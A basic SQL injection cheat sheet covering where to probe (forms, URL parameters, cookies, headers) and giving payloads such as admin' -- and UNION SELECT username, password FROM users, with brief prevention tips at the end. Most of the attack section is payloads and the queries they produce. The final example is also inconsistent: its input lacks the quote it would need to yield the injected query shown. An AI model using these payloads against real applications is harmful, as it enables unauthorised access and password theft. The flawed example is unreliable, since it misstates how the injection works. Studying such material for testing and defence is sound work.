## Basic SQL Injection Cheat Sheet

### 1. Identifying Injection Points

#### Common Injection Points
1. **User Input Fields**:
   - Login forms
   - Search fields
   - Registration forms
   - Contact forms

2. **URL Parameters**:
   - Query strings (e.g., `example.com/products?id=1`)

3. **Cookies**:
   - User information stored in cookies

4. **HTTP Headers**:
   - User-Agent, Referer, etc.

5. **API Endpoints**:
   - RESTful and SOAP API parameters

#### Techniques to Identify Injection Points

1. **Single Quote Test**:
   - Enter a single quote (`'`) in input fields or URL parameters.
   - If an error occurs (e.g., `SQL syntax error`), it indicates a potential injection point.
   - Example:
     ```
     Login Username: admin'
     ```
     SQL Query:
     ```sql
     SELECT * FROM users WHERE username = 'admin'';
     ```

2. **Comment Injection Test**:
   - Use SQL comments (`--`, `#`) to bypass parts of the query.
   - Example:
     ```
     Login Username: admin' -- 
     ```
     SQL Query:
     ```sql
     SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'password';
     ```

3. **Error-Based Testing**:
   - Inject known bad inputs and look for database error messages.
   - Example:
     ```
     Product ID: 1'
     ```
     - SQL Query:
```sql
SELECT * FROM products WHERE id = 1';
```
    
   - Possible error message:
     ```
     SQL syntax error near '1''
     ```

### 2. Basic UNION-Based SQL Injection

#### Understanding the UNION Operator
- The `UNION` operator is used in SQL to combine the results of two or more SELECT statements.
- Each SELECT statement within the UNION must have the same number of columns in the result sets with similar data types.

#### Steps to Perform UNION-Based SQL Injection

1. **Determine the Number of Columns**:
   - Inject a UNION SELECT statement with NULL values to identify the number of columns.
   - Example:
     ```
     Product ID: 1 UNION SELECT NULL, NULL, NULL
     ```
     SQL Query:
     ```sql
     SELECT column1, column2, column3 FROM products WHERE id = 1 UNION SELECT NULL, NULL, NULL;
     ```
   - Adjust the number of `NULL` values until no error is returned.

2. **Find Data Types**:
   - Replace NULL with values matching the data type of each column.
   - Example:
     ```
     Product ID: 1 UNION SELECT 1, 'string', NULL
     ```

3. **Extract Data**:
   - Once the number of columns and their data types are known, extract data from another table.
   - Example:
     ```
     Product ID: 1 UNION SELECT username, password, NULL FROM users
     ```
     SQL Query:
     ```sql
     SELECT column1, column2, column3 FROM products WHERE id = 1 UNION SELECT username, password, NULL FROM users;
     ```

#### Example Injection
Given a vulnerable query:
```sql
SELECT id, name, price FROM products WHERE id = '1';
```
Performing a UNION-based injection:
```
Input: 1 UNION SELECT username, password, '0' FROM users
```
Injected Query:
```sql
SELECT id, name, price FROM products WHERE id = '1' UNION SELECT username, password, '0' FROM users;
```

### Prevention Techniques
- **Parameterized Queries (Prepared Statements)**:
  - Ensures user inputs are treated as data, not executable code.
- **Stored Procedures**:
  - Encapsulate SQL code, reducing the risk of injection.
- **Input Validation**:
  - Validate and sanitize all user inputs.
- **Least Privilege**:
  - Limit database user privileges to reduce the impact of a successful injection.
